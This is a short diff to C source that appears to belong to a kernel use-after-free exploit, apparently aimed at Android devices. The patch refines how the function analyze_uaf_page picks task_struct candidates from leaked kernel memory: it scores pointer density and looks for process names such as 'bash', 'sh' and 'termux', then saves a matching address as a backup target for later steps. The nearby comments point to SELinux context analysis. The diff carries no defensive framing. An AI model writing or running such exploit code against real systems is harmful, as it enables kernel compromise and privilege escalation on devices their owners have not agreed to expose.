@@ -1805,17 +1805,27 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
             (unsigned long)va, kptrs, strings, marker_off, found_str);
     
     // Target bash fallback: ROG task_struct often has kptrs > 150
-    if (marker_off == -1 && kptrs > 100 && strings > 0) {
+    // STRICT: found_str must contain at least one LETTER (a-z, A-Z), not just symbols/numbers
+    int has_letter = 0;
+    for (int i = 0; found_str[i] && i < 64; i++) {
+        if ((found_str[i] >= 'a' && found_str[i] <= 'z') || 
+            (found_str[i] >= 'A' && found_str[i] <= 'Z')) {
+            has_letter = 1;
+            break;
+        }
+    }
+    
+    if (marker_off == -1 && kptrs > 100 && strings > 0 && has_letter) {
          fprintf(stderr, "\n      [!!!] High K-PTR density at VA 0x%lx! Possible task_struct (Sample: \"%s\")", 
                  (unsigned long)va, found_str);
          
          // Plan B: capture any process that looks like a shell or high-density task
          if (strstr(found_str, "bash") || strstr(found_str, "sh") || strstr(found_str, "termux") || kptrs > 150) {
-             if (*(uint64_t*)(gbuf + GBUF_TASK_VA) == 0) {
-                 *(uint64_t*)(gbuf + GBUF_TASK_VA) = va;
-                 fprintf(stderr, " (saved as backup target)");
-             }
-         }
+            if (*(uint64_t*)(gbuf + GBUF_TASK_VA) == 0) {
+                *(uint64_t*)(gbuf + GBUF_TASK_VA) = va;
+                fprintf(stderr, " (saved as backup target)");
+            }
+        }
     }
 
     // SELinux context analysis
